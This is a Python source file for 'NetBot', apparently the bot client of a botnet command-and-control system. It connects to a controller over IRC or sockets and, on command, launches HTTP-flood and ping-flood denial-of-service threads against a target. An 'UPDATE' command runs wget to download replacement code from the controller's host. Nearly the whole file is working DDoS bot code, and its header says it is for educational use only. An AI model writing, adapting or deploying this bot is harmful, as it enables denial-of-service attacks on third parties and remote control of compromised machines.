#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import time
#import requests
import os
import urllib.request
import subprocess
import signal  
import uuid
import random
import re

from irc_class import *


## global enums
COMMUNICATION_MODE_IRC = "IRC"
COMMUNICATION_MODE_SOCKETS = "SOCKETS"

## global properties
IRC_EXPECTED_CC_NICK = "ccc"
IRC_EXPECTED_CC_MESSAGE_REGEX_PATTERN = "([a-zA-Z0-9]+_){4}"

## IRC Config
ircServer = "192.168.1.30" # Provide a valid server IP/Hostname
ircPort = 6697
ircChannel = "#normalPrivateChannel"
ircChannelPass = "P@ssw0rd"
global ircNick
ircNick = "bot"
ircBotnickpass = ""
ircBotpass = ""
ircMessageTimeout = 30

## SOCKETS Config
sHost = '192.168.0.174' # NetBot CCC Server
sPort = 5555 # NetBot CCC Port

class launchAttack:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		run = 0
		#terminate = 0
		if n[3]=="HTTPFLOOD":
			while self._running and attackSet:
				try:
					url_attack = 'http://'+n[0]+':'+n[1]+'/'
					u = urllib.request.urlopen(url_attack).read()
					time.sleep(int(n[4]))
				except:
					pass

		if n[3]=="PINGFLOOD":
			while self._running:
				try:
					if attackSet:
						if run == 0:
							url_attack = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
							pro = subprocess.Popen(url_attack, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
							run = 1
					else:
						if run == 1:
							os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
							run = 0
							break
				except:
					pass
				


def Main():

	#Flags
	global attackSet
	attackSet = 0
	global updated
	updated = 0
	global terminate
	terminate = 0

	# globals IRC
	global ircConn

	global ircNick

	global t 
	t = ""
	message = "HEARTBEAT" # Sends Alive Pings to CCC Server
	communicatonMode = COMMUNICATION_MODE_IRC	
	

	## Connection to server
	try:
		if communicatonMode == COMMUNICATION_MODE_SOCKETS:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Establishing a TCP Connection
			s.connect((sHost,sPort)) # Connect to the CCC Server Socket			
		elif communicatonMode == COMMUNICATION_MODE_IRC:			
			ircNick = ircNick + hex(uuid.getnode()) + str(random.randrange(10000))
			ircConn = IRC(10)
			ircConn.connect(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass)
			print("IRC BOT NICK: " + ircNick)
	except: 
		print("Socket CCC Server not online or failed connection to IRC Server, Retrying every 15 seconds...")
		updated = 0
		time.sleep(15)
		Main()
	
	## Rutine when connected
	lastSend = 0
	
	while True:

		# message sent to server only if timeout before last message sended
		tNow = time.time()
		if tNow - ircMessageTimeout >= lastSend:
			try:
				if communicatonMode == COMMUNICATION_MODE_SOCKETS:
					s.send(message.encode())
					lastSend = tNow
				elif communicatonMode == COMMUNICATION_MODE_IRC:					
					ircConn.send(ircChannel, message)				
					lastSend = tNow
			except:
				Main()
		
		data = ""
		# message received from server
		if communicatonMode == COMMUNICATION_MODE_SOCKETS:				
			data = s.recv(1024)
		elif communicatonMode == COMMUNICATION_MODE_IRC:
			ircChannelMessage = ""
			try:
				ircChannelMessage = ircConn.get_response()
			except: 
				pass
			#print (ircChannelMessage)
			if ircChannelMessage and IRC_EXPECTED_CC_NICK in ircChannelMessage \
				and re.search(IRC_EXPECTED_CC_MESSAGE_REGEX_PATTERN, ircChannelMessage):
				#print("CANDIDATE CCC COMMAND --> " + ircChannelMessage)
				splittedPrivmsg = ircChannelMessage.split(':')
				#print(splittedPrivmsg)
				if len(splittedPrivmsg) == 3:
					data = splittedPrivmsg[2]	
					#print(data)
				


		# print the received message
		#print('CCC Response:',str(data.decode()))

		executeReceivedCommand(data, ircNick)
	# close the connection
	s.close()

# Parses and executes the command received form the server
def executeReceivedCommand(data, ircNick):
	global attackSet
	global t
	#attStatus = "HOLD"
	# Return in case data not received, sockets will ever be informed but in IRC mode can occurs
	if not data:
		return
	
	# If its not a string means its socket data, in bytes, need to decode
	if not isinstance(data, str):
		data = str(data.decode())

	data = data.split('_')
	#print('CCC Response: ', data)  #check list empty code
	if len(data) >= 5:
		# In case command 5 arguments, last one is the botNicks who is addressed the command
		itsMe = True
		if len(data) == 6:
			itsMe = checkCommandNicks(data[5], ircNick)

		if itsMe:
			attStatus = data[2]
			attHost = data[0]
			attPort = data[1]
		else:
			return
	else:
		attStatus = "OFFLINE"
		

	print('CCC Command received: ', attStatus)
	
	if attStatus == "LAUNCH":
		if attackSet == 0:
			print("Starting attack thread.... Type: " + data[3])
			# start a new thread and start the attack (create a new process)
			attackSet = 1
			c = launchAttack()
			t = threading.Thread(target = c.run, args =(data, ))
			t.start()				
		else:
			time.sleep(15)
			if t and t.is_alive():
				print('Attack in Progress...')
	elif attStatus == "HALT":
		attackSet = 0
		time.sleep(30)
	elif attStatus == "HOLD":
		attackSet = 0
		print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
		time.sleep(30)
	elif attStatus == "UPDATE":
		if updated == 0:
			attackSet = 0
			os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
			print('Client Libraries Updated')
			updated = 1
			time.sleep(30)
		else:
			time.sleep(30)
	else:
		attackSet = 0
		print('Command Server Offline. Retrying in 30 seconds...')
		updated = 0
		time.sleep(30)

def checkCommandNicks(commandNicks, nickToSearch):
	commandNicks = commandNicks.replace('\r\n', '')	
	if nickToSearch in commandNicks.split(';'):
		return True
	else:
		return False

if __name__ == '__main__':
	Main()